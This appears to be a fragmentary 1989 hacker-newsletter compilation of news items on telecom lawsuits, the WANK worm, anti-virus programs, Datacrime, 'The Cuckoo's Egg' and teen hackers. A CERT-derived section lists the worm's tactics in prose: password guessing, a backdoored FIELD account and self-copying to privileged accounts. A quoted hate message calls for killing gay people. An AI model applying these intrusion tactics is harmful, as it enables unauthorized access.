as her file grew to 2 feet thick.   He had me by the guts,  she said.   I was obsessed with finding him.  He's a typical 16 year old, but a little more menacing.  He is pretty smart, but he had absolutely nothing to do, but sit in his room with his computer equipment and all he had to do was talk on the phone.  _______________________________________________________________________________  Just The FAX, Please                                           November 6, 1989                      by Noam Cohen  New York Times   Teachers in rural Minnesota are ready to hear the most up to date version of the oldest excuse in the book    Honest, teach, the fax ate my homework.   Yes, the facsimile machine has gone to school in Sibley County, an agricultural area 60 miles southwest of Minneapolis St. Paul.  It is the last component to be installed in a four year old interactive television system, or ITV, that brings advanced classroom instruction to small, isolated areas through closed circuit cable television.  In an education system where students adjust the contrast knobs to get a better look at their calculus teacher, it is hardly surprising that these students are the first in the country to use the fax to receive or hand in homework.  David Czech, the telecommunications director for the school district who is responsible for its cable system education program, said that now, televised teachers can even give surprise quizzes.   The fax makes the classroom truly self contained,  said Kelly Smith, an assistant principal at Gibbon Fairfax Winthrop High School, in Sibley County, who taught mathematics for the ITV program before fax machines were introduced. He said that when he taught he  had to rely on transportation in the district and assignments always stacked up.   The fax machines, part of a special line made by Ricoh Corporation, transmit on the same wiring that carries the television image to students.  By using cable instead of telephones, the district saves money on telephone costs and receives quicker, cleaner copies.  The machines have a built in copier, allowing one student to retrieve the assignment and hand copies to classmates  usually no more than eight . Students then use the machine to hand back work.  The Sibley County school district purchased and installed the fax machines with the remaining  22,000 of a  150,000 state grant for ITV, according to Czech.  The machines, which school officials and a Ricoh spokeswoman say are the first to be used in high school education, have generated interest elsewhere.  Czech says he has received calls from education officials in Hawaii, Wisconsin, Ohio and other parts of Minnesota. _______________________________________________________________________________  MCI Sues AT T    Charges Deceptive Advertising                 October 12, 1989                                                        We Welcome The Opportunity To Discuss Who Is Misleading Whom...   AT T is using false and malicious advertising to protect its long distance business, MCI Communications Corporation charges in a lawsuit filed Tuesday, October 10.  MCI, whose 10 percent market share makes it a distant number two to AT T's 75 percent, says its giant rival is resorting to false claims in the hope of stemming the loss of 100,000 customers to MCI each week.  AT T, however, says it will defend itself with a countersuit.  According to AT T spokesman Herb Linnen    We welcome the opportunity to discuss who is misleading whom... we have been quite concerned for some time now about MCI's misleading print and broadcast advertising.  We have taken our complaints directly to MCI without success.   He added,  AT T stands behind its advertising.   This latest litigation is simply the latest chapter in MCI's long and very bitter battle with AT T, which began in the 1970's when MCI successfully broke AT T's long distance monopoly by offering  Execunet,  the first long distance service bypassing AT T offered to the public.  The two companies have battled each other at the Federal Communications Commission, which authorizes the rates for each, ever since.  This is the first time since AT T's divestiture that the arguments have been taken into a courtroom.  In an interview, MCI Chairman William McGowan said that  AT T ads are sleazy,  and he noted that the nine month old campaign grew increasingly negative, forcing MCI into the courts.  AT T responded saying that MCI is resorting to the courts since  ...they just can't hack it in the marketplace...   McGowan responded that he believes a lawsuit is the only way to fight a company which is spending two million dollars a day on advertising.  He said,  Our budget is big     51 million    but how do you compete with someone who is nine or ten times your size in advertising    MCI is still studying the impact of the latest round of AT T ads, but McGowan said he is sure MCI should have gained  a lot more  than 100,000 customers per week if not for the advertising.  The advertising has not affected professional telecommunications managers, but does have an impact on individual and small business customers, he said.  The MCI suit, filed in U.S. District Court in Washington, DC, alleges that AT T's advertising campaign  maliciously attacked MCI's honesty and the value of MCI's products and service by falsely and deceptively representing that it is superior to its competitors in general, and MCI in particular, in terms of trustworthiness, quality and price.  MCI's suit cites AT T ads that assert MCI's rates are cheaper than AT T's only when calls are made over 900 miles away and after 7 p.m. MCI's suit also takes umbrage at AT T's advertisement which states that MCI customers  might have better luck calling Mars than trying to reach MCI representatives for an explanation of their bills.   The ads, the suit charges, also claim non AT T companies provide slow telephone connections  that other companies do not operate worldwide like AT T  and that competing 800, facsimile and WATS services are inferior.  The suit says AT T  has wrongfully profited and MCI has been damaged by being wrongfully thwarted from maximizing its sales potential.   The suit asks the court to order AT T to discontinue advertising its services for a period of one year and that advertisements after that time be approved by the court and carry a notice to that effect in the advertisement itself. Additionally, it asks for profits  wrongfully amassed  by AT T on the sale of its products and services during the past year, plus interest and legal fees.  McGowan was particularly irked by a claim that MCI's fax service has 57 percent more problems than AT T faxes.  He said that number was arrived at by figuring the difference between AT T service    with 4.9 percent errors    and MCI, with 7.7 percent errors.  Rather than reporting the 2.8 percent difference, the ad claims a 57 percent higher rate    the percentage increase between 4.9 percent and 7.7 percent.   Talk about misleading,  McGowan said.   Yes, talk about misleading,  said Herb Linnen.   They've survived this long in part based on the deceptions they've used on a public not well educated on the technical aspects of telephony... we'll clear this up once and for all in court with a countersuit.                                                                                    Unleashing Ma Bell                                             October 24, 1989                    by Peter Passell  New York Times                     Could AT T's rivals in long distance phone                  service survive no holds barred competition   Since the breakup of the telephone monopoly in 1984, the Federal Communications Commission has kept AT T on a short leash to prevent the giant company from chewing up the  small fry.   But now two of those small fry have grown into profitable multibillion dollar corporations, and AT T is asking the regulators for the freedom to fight for market share.  If the FCC agrees    a crucial decision could come as early as Thursday    high volume telephone users are likely to reap a bonanza from lower prices.  When the Bell System was dismembered, analysts generally agreed that rivals would need a lot of help from Washington to gain a secure foothold in the long distance market dominated by the ultimate name brand company.  The analysts were right   After AT T's competitors lost their discounts on regulated charges for hookups to local telephone exchanges, all of them took a financial bath and some went broke.  But in the ensuing consolidation, a few companies emerged with both the technical capacity to match AT T's service and the marketing savvy to sell themselves to once skeptical consumers.  MCI Communications now has 12 percent of the long distance market and in the last year has grown four times as fast as AT T.  US Sprint Communications, with its much ballyhooed all fiber optic system, has an 8 percent share and is the principal carrier for 117 of America's 800 largest companies.  Joel Gross, a communications analyst at Donaldson, Lufkin   Jenrette, believes a fourth network, assembled from a half dozen smaller companies, will soon emerge.  One reason AT T's rivals have managed to do so well in the last few years is continuing regulatory discrimination.  Last summer, the FCC switched AT T from traditional fair rate of return regulation to a more flexible  price cap  system that gives the company discretion to adjust individual rates within a narrow price band.  But neither the old price regulations nor the new ones apply to MCI, US Sprint and other smaller long distance companies.  And they have taken advantage of AT T's inability to cut prices, offering volume discounts where AT T is most vulnerable to customer defections.  AT T has fought back, convincing the FCC to allow it fast track approval for rate concessions needed to hang onto its biggest customers.  And it is now asking the commission for broad discretion to cut rates by more than the 5 percent permitted under the price cap rule.  If the FCC agrees, it is a sure bet that AT T will price aggressively, accepting sharp reductions in its fat profit margins to check its loss of market share.  It is obvious why MCI and US Sprint are unhappy at the prospect of an AT T unleashed. But it is not so easy to see how the public would lose from the ensuing donnybrook.  One worry is that AT T would slash prices by enough to drive rivals out of business, and then be free to price gouge.  But as Peter Pitsch, a former FCC staff member who now consults for AT T points out, such  predatory  pricing is only a plausible option if the predator can hope to make up the inevitable short term losses with long term monopoly gains. And two considerations make such a calculation unlikely.  Once the cables have been laid and the switches installed, it costs very little to operate a long distance phone system.  Thus even if AT T were able to drive MCI and US Sprint into bankruptcy, their creditors would find it advantageous to continue to sell long distance services.  And if AT T somehow did manage to shut down its rivals, the FCC would hardly be likely to reward it with permission to charge monopoly prices.  Another concern is that price cutting would make long distance service unprofitable for all, discouraging further investment.  That, however, might not be such a bad thing.  Losses are capitalism's way of telling businesses to slow down   There is enormous overcapacity in long distance communications and more investment anytime soon is unlikely to be productive.  Does all this mean the commission will hang tough and permit AT T to flex its competitive muscles  A year ago, when the FCC was dominated by Reagan appointed free marketers, the answer would have been easy.  Today, with a Bush appointed majority led by a chairman, Alfred Sikes, of less certain ideological bent, it is hard to say.  MCI and US Sprint have managed to squeeze a lot of regulatory mileage out of their underdog status, and certainly will not give up the privileges that go along without a fight.                                                                                   AT T Strikes Back   Countersues MCI                            October 27, 1989                                     AT T struck back on Thursday, October 27 at advertising claims made by MCI Communications Corporation and received two rulings from the Federal Communications Commission affecting regulation of its long distance services.  AT T said in a countersuit against MCI filed in Washington, DC that MCI was misleading consumers through false and deceptive advertising in its business and residential long distance service.  AT T's filing denied similar allegations made by MCI in a suit filed October 10.  Victor Pelson, AT T group executive, said MCI unfairly compared its discount service with AT T's regular long distance service rather than its discount service.  Pelson also denied claims that the quality of MCI voice service was superior to AT T's, or that its facsimile service featured fewer garbled transmissions than AT T's.   We intend to clarify any misconceptions in the market,  said Merrill Tutton, AT T Vice President for consumer marketing.  MCI spokeswoman Kathleen Keegan Thursday responded that,  our ad claims are accurate...  We will soon be filing a motion for a preliminary injunction to cause AT T to cease its advertising campaign.   Also on Thursday, the Federal Communications Commission upheld a decision giving AT T greater freedom to compete for big corporate customers but rejected another pricing plan by AT T.  The FCC voted unanimously to uphold a pricing plan known as Tariff 12, which lets AT T offer corporate customers a package of communications services.  AT T contends it is at a disadvantage because MCI does not have to submit detailed filings to the FCC before they can serve customers.  MCI had challenged Tariff 12, asking the FCC to overrule it and prohibit AT T from offering full service communications packages to its customers.  In the second item, the FCC declared unlawful a pricing plan known as Tariff 15, that AT T had applied solely to a single customer, the Holiday Corporation, owner of the largest hotel chain in the United States.  The FCC said AT T could no longer justify the special rates to a single customer to meet competition when MCI was making the same service available to customers generally.

A Georgetown University law student, Craig Dean, said he saw the message              HELP STAMP OUT A.I.D.S. NOW   KILL ALL QUEERS AND JUNKIES   It flashed five times in 25 minutes.  Minutes after seeing the message, he called the city Human Rights Office and the Washington Blade, a gay community newspaper.  Doug Hinckle, a staff photographer for the Blade, saw the message flash once and photographed it.  Judith Miller, president of Miller Companies, which own the building at 1101 Connecticut Avenue NW and the message board, said she did not know how the statement got onto the board.  She refused to believe it had appeared until she was shown of the photographs.  Her company has complete control of the board and does not accept any paid messages or advertisements, Miller said.   I would never do anything like that,  she said.   There is no way I would allow such a statement to appear.   Yesterday, Keller, a five year employee of the Miller Companies, said he did not write the statement and does now know how it became part of the normal flow of headline news.  Miller said she believes her computer system may have a  virus  and will have experts search to find where the unauthorized statement originated.   How absolutely awful,  she said of the message. _______________________________________________________________________________   WANK  Worm On SPAN Network                                    October 17, 1989                              From The Computer Emergency Response Team  On October 16, the CERT received word from SPAN network control that a worm was attacking SPAN VAX VMS systems.  This worm affects only DEC VMS systems and is propagated via DECnet protocols, not TCP IP protocols.  If a VMS system had other network connections, the worm was not programmed to take advantage of those connections.  The worm is very similar to last year's HI.COM  or Father Christmas  worm.  This is NOT A PRANK.  Serious security holes are left open by this worm. The worm takes advantage of poor password management, modifies .com files, creates a new account, and spreads to other systems via DECnet.  It is also important to understand that someone in the future could launch this worm on any DECnet based network.  Many copies of the virus have been mailed around.  Anyone running a DECnet network should be warned.  R. Kevin Oberman from Lawrence Livermore National Labs reports         This is a mean bug to kill and could have done a lot of damage.      Since it notifies  by mail  someone of each successful penetration      and leaves a trapdoor  the FIELD account , just killing the bug is      not adequate.  You must go in an make sure all accounts have      passwords and that the passwords are not the same as the account      name.   The CERT CC also suggests checking every .com file on the system.  The worm appends code to .com files which will reopen a security hole everytime the program is executed.  An analysis of the worm appears below and is provided by R. Kevin Oberman of Lawrence Livermore National Laboratory.  Included with the analysis is a DCL program that will block the current version of the worm.  At least two versions of this worm exist and more may be created.  This program should give you enough time to close up obvious security holes.                                                                                                              Report on the W.COM worm.                                R. Kevin Oberman                             Engineering Department                     Lawrence Livermore National Laboratory                                October 16, 1989  The following describes the action of the W.COM worm  currently based on the examination of the first two incarnations .  The replication technique causes the code to be modified slightly which indicates the source of the attack and learned information.  All analysis was done with more haste than I care for, but I believe I have all of the basic facts correct.  Here is a description of the program   1. The program assures that it is working in a directory to which the owner     itself  has full access  Read, Write,Execute, and Delete .  2. The program checks to see if another copy is still running.  It looks for a    process with the first 5 characters of  NETW_ .  If such is found, it    deletes itself  the file  and stops its process.     Note   A quick check for infection is to look for a process name starting           with  NETW_ .  This may be done with a SHOW PROCESS command.  3. The program then changes the default DECNET account password to a random    string of at least 12 characters.  4.

If it has SYSPRV, it disables mail to the SYSTEM account.  8. If it has SYSPRV, it modifies the system login command procedure to    APPEAR to delete all of a user's file.   It really does nothing.   9. The program then scans the accounts logical name table for command    procedures and tries to modify the FIELD account to a known password with    login form any source and all privs.  This is a primitive virus, but very    effective IF it should get into a privileged account.  10. It proceeds to attempt to access other systems by picking node numbers at     random.  It then used PHONE to get a list of active users on the remote     system.  It proceeds to irritate them by using PHONE to ring them.  11. The program then tries to access the RIGHTSLIST file and attempts to access     some remote system using the users found and a list of  standard  users     included with the worm.  It looks for passwords which are the same as that     of the account or are blank.  It records all such accounts.  12. It looks for an account that has access to SYSUAF.DAT.  13. If a priv. account is found, the program is copied to that account and     started.  If no priv account was found, it is copied to other accounts     found on the random system.  14.

Computer Network At NASA Attacked By Rogue Program             October 18, 1989                                                    by John Markoff  New York Times   A rogue computer program attacked a worldwide network of the National Aeronautics and Space Administration on Monday, October 16, inflicting no damage but forcing officials to disconnect the network from sensitive military and space systems.  Security experts speculated that the program was written by someone who opposed Tuesday's  October 17  scheduled launching of the space shuttle Atlantis, which was to carry a nuclear powered satellite into orbit.  The launching was postponed because of bad weather.  NASA officials said the rogue program attacked an academic and research network, the Space Physics Analysis Network, which is not used for space shuttle mission control.  But a NASA official said the agency felt compelled to disconnect several links between the network and an operational space shuttle network as a precaution.  Computer security experts at several national laboratories said the Department of Defense had also severed the connection between commercial and research networks and nonclassified network that connects United States military installations and contractors around the world.  The program was designed to copy itself secretly and send unwanted, sometimes vulgar messages to users of the NASA network.  It also tricks users into thinking that data have been destroyed, although no data are damaged.  Like similar programs that have been sent into computer networks by pranksters and saboteurs, it exploited a flaw in the security system designed to protect the computers on the network.  Computer security experts said Tuesday that they knew of about 60 computers that had been affected by the program.  A NASA spokesman said the program was still spreading.  While the network is widely available to academic researchers with personal computers, the rogue program was designed to attack only 6,000 computers manufactured by the Digital Equipment Corporation.  The flaw in the security of the Digital Equipment computers had been widely publicized over a year ago even before a similar rogue program jammed a group of interconnected international networks known as the Internet.  NASA officials said the program was only able to attack computers in which the necessary steps had not been taken to correct the flaw.  Among the messages the program displayed on all infected computers was one that read    Worms Against Nuclear Killers.  You talk of times of peace for all, and then prepare for war.   Computer scientists call this kind of program a worm, a reference to a program first described in the novel  Shockwave Rider  by a science fiction writer, John Brunner. _______________________________________________________________________________  Virus Controversies Again                                       October 6, 1989                           by John Markoff  New York Times           The issue has also sparked interest among computer scientists.   Harold Highland, editor of Computers   Security, a professional journal, said he had received two research papers describing how to create such anti virus programs.  He has not decided whether to publish them.   No one has raised the obvious ethical questions,  he added.   I would hate to see a virus released to fight viruses.  Until it's tested you don't know whether it's going to do more damage than the program it is designed to fight.   A number of these programs have already been written, computer researchers said.  The one that destroyed the data on business and governmental personal computers in the United States was reportedly designed by a Venezuelan programmer.  How many computers were affected and where they were is unclear.  That program is called Den Zuk, or Search.  It was intended to attack a destructive program known as the Brain Virus that was distributed in 1986 by two brothers who owned a small computer store in Pakistan.  Errors in the design of the program illustrate the potential danger of such viruses, critics say.  Fridrik Skulason, a microcomputer specialist at the University of Iceland in Reykjavik, who has disassembled the program, said the author of Den Zuk had failed to take into account the different capacities of disks available for IBM and IBM compatible machines.  Because of that simple error, when the program infects a higher capacity disk it destroys data.   They probably wrote with good intention,  he said.   The only problem is that the programmers were not able to do their job correctly.   At least two other anti viral viruses have already been devised, said Russell Brand, a computer security researcher at Lawrence Livermore.  He said programmers at one company, which he would not identify, had written the programs to combat the Scores virus, a program that infected Macintosh computers last year.  He added that even though the programs were designed so they could not go beyond the company's own computers, there had been a heated debate over whether to deploy the programs.  He said he did not know how it was decided.  Brand said a group of computer researchers he works with at Lawrence Livermore had written several self replicating programs after the appearance of the rogue program that Morris of Cornell is accused of writing.  But he added that the group had never given permission to release the programs.  The debate over vigilante viruses is part of a broader discussion now taking place among some computer researchers and programmers over what is being termed  forbidden knowledge.    There are ethical questions any time you send something out there that may find itself invited on to somebody else's computer,  said Pamela Kane, author of a book on computer virus protection.  In California this month a group of computer hackers plans to hold a forum on  forbidden knowledge in a technological society.   While the role of the computer hacker has been viewed as mischievous in a negative way, hackers have consistently played a role as innovators, said Lee Felsenstein, a Berkeley, California, computer expert who designed several early personal computers.   Computer hacking was originally a response to the perception of a priesthood's control over immensely powerful technological resources,  he said.   Informed individuals were able to break the power of this priesthood through gaining and spreading the body of forbidden knowledge.                                                                                    Dreaded Personal Computer Virus May Be Only A Cold              October 6, 1989                                                    by Don Clark  New York Times   It won't be much of a plague.  But the hysteria anticipating it has been world class.  Those observations come from computer security experts as they await Datacrime, a virus program set to attack IBM compatible personal computers starting Thursday, October 12, 1989.  Analyses of the program, also called the Columbus Day Virus, show that it is indeed destructive.  It just hasn't spread very far.   It's going to be the week of the non event,  predicted John McAfee, a Santa Clara, California, consultant who serves as chairman of the Computer Virus Industry Association.   You have more chance of being hit by a meteor than getting this virus.   McAfee Associates, which acts as a clearinghouse for virus information, has received just seven confirmed reports of Datacrime in six months    compared with three to 50 reports per day about another virus that originated in Israel in 1987.  He thinks only 50 copies of Datacrime exist, and 40 of those are in the hands of researchers.   It's gotten more publicity than it deserves,  agreed Russell Brand, another virus expert, who advises Lawrence Livermore National Laboratory.  Brand expects to find just 20 copies among the 75,000 computers he monitors at 1,000 sites.  Such projections are disputed by some.  They are based on how often Datacrime has been detected by computer users using special software that scans their systems for the virus.  The virus could have infected many users who have not bothered to scan their systems, McAfee concedes.  Fears have been whipped up by the news media and computer managers at companies and government agencies.  Companies promoting products to eradicate viruses also have played a role    understandably.  Staid IBM Corporation this week took the unusual step of offering a program that checks systems for viruses.  The company hasn't detected the virus in its own operations, but concedes that many customers are worried.   They are asking us how we protect our software development operations from viruses,  said Bill Vance, who was appointed a year ago as IBM's director of secure systems.  Bank of America, a huge IBM customer with 15,000 PCs, recently put out a company wide notice advising users to make backup copies of their computer data by Wednesday, the day before the virus is programmed to strike.  Three different government agencies have panicked and sent out multiple versions of incorrect advice,  Brand said.  Worried calls have deluged McAfee's office, which has just three lines for computer communications and three for voice.   We put the phone down and it's 30 seconds before it rings again,  he said.  Computer sleuths detected Datacrime    and have detected other viruses    by looking for changes in the size of data files and in the way programs operate. The underlying code used to write the program, once disassembled by experts, indicates when the program will activate itself.  The identity of Datacrime's author isn't known, although some reports have linked the virus to an anonymous hacker in Austria.  It first began showing up in March, McAfee said, and gained notoriety after it was discussed at the midsummer Galactic Hackers Conference in Amsterdam.  It appears to be relatively prevalent in the Netherlands and other European countries.  Dutch computer users have reportedly bought hundreds of programs that are said to detect and destroy the program.  Like other viruses, Datacrime rides along with innocuous programs when they are exchanged over a computer network or computer bulletin board or through exchange of infected disks.  Unlike many viruses, it has been designed to later insert itself in data files that users don't often examine.  If one of the programs is executed after the target date, Datacrime proceeds with its dirty work    destroying the directory used to keep track of files on a computer's hard disk.  The crime is analogous to destroying a card file in the library.   By destroying this one table you can't find where any of your data is,  said Brand.  But no one should really be in a fix if he makes backup copies of data, experts say.  The data, once safely stored on another disk drive or on magnetic tape, can be restored by computer professionals even if the virus has infected the backup files.                                                                                    Vaccines  To Hunt Down Rogue Programs                          October 6, 1989                                        by John Markoff  New York Times   Ever since a rogue program created by a graduate student jammed a nationwide computer network last year, the rapid spread of such disruptive software, often known as viruses, has caused growing alarm among computer users.  Now, to fight fire with fire, some companies, individuals and even a government research laboratory are crafting a new breed of what have been called anti viruses to hunt down intruders.  The trouble is, some computer security experts say, the problem of viruses may be exaggerated    and the new crime fighter may do even more damage than the criminal.  Much like an infection, a well intended but badly designed program to stop viruses can run amok, knocking out thousands of computers or destroying vast amounts of data.  Indeed, one of the anti virus programs intended to defeat a known virus has already destroyed data on business and governmental personal computers in the United States.  The issue has touched off a heated debate over whether the creation of these high technology vigilantes is a responsible action.   The risks are just enormous,  said Peter Neumann, a computer security expert at SRI International, a technology research center in Menlo Park, California.   It's an unbelievably unsafe thing to do.   But Chris Traynor, a programmer at Divine Axis, a software development company in Yonkers, New York, argues that anti virus programs can be contained so that they do not spread out of control, reaching and possibly damaging data in other computers.  His company is now trying to design such a program.  Computer researchers at the Lawrence Livermore Laboratory, a federal weapons center in Livermore, California, have designed similar programs that patrol computer networks in search of breaches through which viruses could enter the system.  Viruses, which got their name because they mimic in the computer world the behavior of biological viruses, are programs, or sets of instructions, that can secretly be spread among computers.  Viruses can travel either over a computer network or on an infected disk passed by hand between computer users.  Once the infection has spread, the virus might do something as benign as displaying a simple message on a computer screen or as destructive as erasing the data on an entire disk.  Computer security experts have been concerned for several years by the emergence of vandals and mischief makers who deliberately plant the destructive programs.  But in recent weeks international alarm has reached new heights as rumors have spread that a virus program will destroy data on thousands of computers this month, on Friday the 13th.  Computer security researchers said the virus, known as Datacrime, was one of at least three clandestine programs with internal clocks set to destroy data on that date.  As is usually the case, no one knows who wrote the program, but U.S. military officials have mentioned as possible suspects a European group linked to West German terrorists and a Norwegian group displeased with the fame of Christopher Columbus, who is honored next week.  Largely in response to customer concerns, IBM said on Monday that it was offering programs for its personal computers that would scan for viruses.  But several computer security experts say public fears are largely exaggerated.  They note that there have been fewer than a dozen reported appearances of the Datacrime virus in the United States, and contend that the whole issue is overblown.  Still, in the personal computer world, where many users have little knowledge of the technical workings of their machines, concern over computer viruses has become widespread.  The issue got the most attention last November, when, it is charged, Robert Morris, a graduate student at Cornell, unleashed a rogue program that because of a small programming error, ran wildly out of control, copying itself hundreds of times on thousands of computers, overloading a national network,  As a result of the mounting concern, a new industry has blossomed offering users protective programs known as vaccines, or anti viral software.  These programs either alert users that a virus is attempting to tamper with their computer or scan a computer disk and erase any rogue program that is detected.  These conventional programs do not automatically migrate from computer to computer, but now some experts are exploring fashioning programs that graft the powers of the vaccines onto viruses in order to pursue and stop them wherever they go.  Designing and spreading such programs was proposed in August by several people attending an international gathering of computer hobbyists, or  hackers,  in Amsterdam.  They suggested that it was a good way for members of the computer underground to make a positive contribution.  But many researchers believe the idea is dangerously flawed because of the possibility of accidentally doing great damage.  Some computer security researchers worry that writing an infectious program to stop viruses may be taken as an intellectual challenge by hackers who are well meaning but do not grasp what problems they could create.   One of the questions that the hacker community is now addressing is what you do about young hackers,  said Stewart Brand, a writer in Sausalito, California, who is working on a book on outlaw cultures and high technology.   They don't have a sense of responsibility  they have a sense of curiosity. These are deliciously debatable issues, and I don't see them going away.

Clifford Stoll, the new man in the office, is assigned to reconcile the shortfall.  Although an astronomer by training, Stoll has recently seen his grant money run dry and so has been transferred from the Keck Observatory at the Lawrence Berkeley Lab down to the computer center in the basement of the same building. No wizard at computers, he thinks he can pick things up fast enough to get by. So he sets out to look for the 75 cents.  He quickly discovers that no glitch in the accounting programs has occurred. No, what seems to have happened is that an unfamiliar user named Hunter briefly logged on to the system, burning up 75 cents worth of time.  Since there is no account record for Hunter, Stoll erases him from the system.  The problem is solved, or so it seems.  But almost immediately, an operator from Maryland on the same network that the Lawrence Berkeley Lab uses complains that someone from Stoll's lab is trying to break into his computer.  When Stoll checks the time of the attempt, he discovers that the account of someone named Joe Sventek, who is known to be in England for the year, has been used.  So he guesses that the user calling himself Hunter has somehow activated Sventek's account.  But who is this hacker  as Stoll begins to refer to him , where is he operating from and how is he getting into the system   Next Stoll sets up systems to alert him every time the hacker comes on line and monitor his activities without his being aware of it.  He watches as the hacker tries to lay cuckoo's eggs in the system's nest, by which of course he means programs for other users to feed    for instance, a program that could decoy other users into giving the hacker their secret passwords.  He watches as the hacker invades other computer systems on the networks the Lawrence Berkeley Lab employs, some of them belonging to military installations and contractors.  The mystery grows.  Telephone traces gradually establish that the hacker is not a local operator, is not on the West Coast and may not even be in North America.  But of the various three letter organizations that Stoll appeals to for help    among them the FBI, the CIA and even the National Security Agency    none will investigate, at least in an official capacity.  By now a reader is so wrapped up in Stoll's breezily written account of his true adventure in  The Cuckoo's Egg   Tracking a Spy Through the Maze of Computer Espionage  that he is happy to overlook certain drawbacks in the narrative    most conspicuously the lack of consistently lucid technical talk and the author's dithering over whether appealing for help to the likes of the FBI and CIA is selling out to the enemy, a qualm left over from the 1960s mentality that still afflicts him and his friends.  The only truly annoying aspect of the book is that an endpaper diagram gives away the location of the computer spy.  Readers are advised not to look at the endpapers, which do little but spoil the suspense.  Unfortunately, the narrative, too, eventually helps dissipate the story's tension.  The officials who finally take over the hunt from Stoll are so reluctant to tell him what is happening that all the suspense he has created simply evaporates.  Even Stoll seems to lose interest in the identity of his mysterious antagonist, judging by the limp and haphazard way he finally does give us the news.  Instead of building his story, he allows himself to be distracted by a banal domestic drama centering on his decision to stop being afraid of emotional commitment and marry the woman he has been living with for seven years.  And he continues limply to debate the need of the state to defend the security of communications networks against wanton vandalism, as if there were room for serious discussion of the question.  Still, nothing can expunge the excitement of the first two thirds of  The Cuckoo's Egg,  particularly those moments when the author hears his portable beeper going off and bicycles to his lab to read the latest printout of the hacker's activities.  Nothing can relieve our discouragement at the bureaucratic runaround that Stoll got.  Had a million dollars worth of damage occurred  the FBI kept asking him.   Well, not exactly,  he would reply.  Then there was nothing the FBI could do.  And so it dishearteningly went, although some points should be conceded. Certain individuals in government agencies were extremely helpful to Stoll.  The entire issue of computer network security was after all a new and unexplored field.  And the agencies that the author was asking for help probably knew more about the security threat than they were willing to tell him.  Finally, nothing can diminish the sense of the strange new world Stoll has evoked in  The Cuckoo's Egg     a world in which trust and open communication will determine the quality of the future.  Whether such values will prevail will prove a drama of momentous significance.  Even if this book finally dissipates that drama, its very presence makes these pages worth dipping into. _______________________________________________________________________________  Digital's Hip To The Standards Thing                           October 10, 1989                                      NEW YORK    During a creative session at a major public relations firm to formulate a new corporate message for Digital Equipment Corporation that reflects the company's new direction promoting and supporting computing industry standards, the shopworn phrase  Digital has it now  was replaced by a new tag line that is more contemporary and tied to DEC's adherence to standards.                              DECrap by Rapmaster Ken                      Digital's Hip to the Standards Thing                         I heard some news just the other day                 It sounded kinda strange and I said,  No way!                     But I heard it again from another source                  It mighta made sense and I said,  Of course!                       Now computer biz has a lotta confusion                  'Cause operating systems abound in profusion.                 But there's a whole new wave in data processing                 Now that Digital's hip to the standards thing.                                      chorus                       Digital's hip to the standards thing!                      Digital's hip to the standards thing!                           Way back when a long time ago                            IBM owned the whole show.                    But other dudes saw this proprietary mess                 And formed committees to find out what's best.               Some went their own way and built their own software          But users were perturbed,  It's just a different nightmare.                    So they got together to look over the picks                      Put down their money on good 'ol UNIX                                      chorus                       Digital's hip to the standards thing!                      Digital's hip to the standards thing!                    Now Digital always kept their users in mind                     And pushed VMS as the best of the kind.                    A lotta folks agreed but kept askin' for                       UNIX support,  We gotta have more!                     Soon DEC saw the light and decided to give                 UNIX to the masses,  sorta live and let live .

All in all, this is the best issue of 2600 Magazine I have read in several issues  despite the fact that some of the material had appeared in Phrack Inc., LOD H TJs, and or Telecom Digest previously .

The  outer  cover of this newsletter was a  warning  from The Predat0r concerning the nature of the material inside.  The true or  inner  cover of the newsletter had the following             The Information You've Requested Of TAP Publishing Society                  A Unit Of The Technological Advancement Party                                    Presents...   ...a family of people dedicated to the advancement of home computer systems and electronic technology, the study and duplication of related communication networks and the subsequent utilization of one's own ingenuity in today's fast paced world of creative logic.

There were a few other interesting  tid bits  of information scattered throughout the four loose pages including the new TAP logo  that was made to resemble CompuTel  and other pictures.  The staff at TAP also included a postcard that contained a reader's survey.  It asked all sorts of questions about how the reader liked certain aspects of the publication... I found the idea to be potentially productive in improving the quality of the newsletter all around.  The cost of TAP is rather cheap... it is free.

Daley announced that he would submit     to the city council a plan to increase city telephone taxes by 95 cents per     line per month, earmarked for improvements to 911 service.  Currently there     is no such flat charge, simply a percentage tax rate on local telephone     service.      Daley's spokespeople commented that 911 service here has been a mess for     years, and that many of the suburbs charge  1.00 per line per month, so 95     cents should not be unreasonable.  There were no details about what is     currently wrong or about what specific improvements Daley has in mind.                                                                                 2.  Hacker Caught by Caller ID  October 9, 1989     MIS Week reported the     apprehension of a 15 year old hacker who used his Amiga personal computer     to tap into two minicomputers at Grumman.  The youngster was from     Levittown, Long Island and stumbled into the computer by using a random     dialing device attached to his computer.  Grumman security was able to     detect the intrusions, and the computer's recording of the boy's telephone     number led police to his home.                                                                                 3.  14 Year Old Cracks TRW Credit For Major Fraud  October 18, 1989     A     14 year old Fresno, California boy obtained secret  access codes  to the     files of TRW Credit from a bboard and used them to pose as a company or     employer seeking a credit history on an individual whose name he picked     randomly from the phone book.  From the histories, he obtained credit card     numbers which he then used to charge at least  11,000 in mail order     merchandise  shipped to a rented storeroom  and make false applications for     additional cards.  He also shared his findings on computer bulletin boards.      Police began investigating when TRW noticed an unusual number of credit     check requests coming from a single source, later found to be the youth's     home telephone number.  The high school freshman, whose name was not     released, was arrested at his home last week and later released to his     parents.  His computer was confiscated and he faces felony charges that     amount to theft through the fraudulent use of a computer.       Here is a 14 year old boy with a  200 computer in his bedroom and now he     has shared his data with countless other hackers all over the nation,  said     Fresno Detective Frank Clark, who investigated the case.   The potential      for abuse of the information  is incredible.

Computer Virus Countermeasures Article  October 25, 1989     Readers of     Phrack Inc. might be interested in an interesting article in the October     1989 issue of DEFENSE ELECTRONICS, page 75, entitled  Computer Virus     Countermeasures    A New Type Of Electronic Warfare,  by Dr. Myron L.     Cramer and Stephen R. Pratt.                                                                                 5.  Computer Viruses Attack China  November 6, 1989     The Ministry of Public     Safety of People's Republic of China found this summer that one tenth of     the computers in China had been contaminated by three types of computer     virus    Small Ball,   Marijuana,  and  Shell.   The most serious damage     was found in the National Statistical System, in which  Small Ball  spread     in 21 provinces.  In Wuhan University, viruses were found in  ALL  personal     computers.      In China, three hundred thousand computers  including personal computers      are in operation.  Due to a premature law system the reproduction of     software is not regulated, so that computer viruses can easily be     propagated.  Ministry of Public Safety now provides  vaccines  against     them.  Fortunately, those viruses did not give fatal damage to data.                                                                                 6.  More Phone Card Fraud  October 31, 1989     Two men were convicted by Tokyo     District Court on Monday, October 30, for tampering with Nippon Telephone     and Telegraph calling cards to increase the number of calls they could     make.  The court ruled that they violated the Securities Transaction Law.      One man, Kawai, was sentenced to 30 months in prison, and another, Sakaki,     was 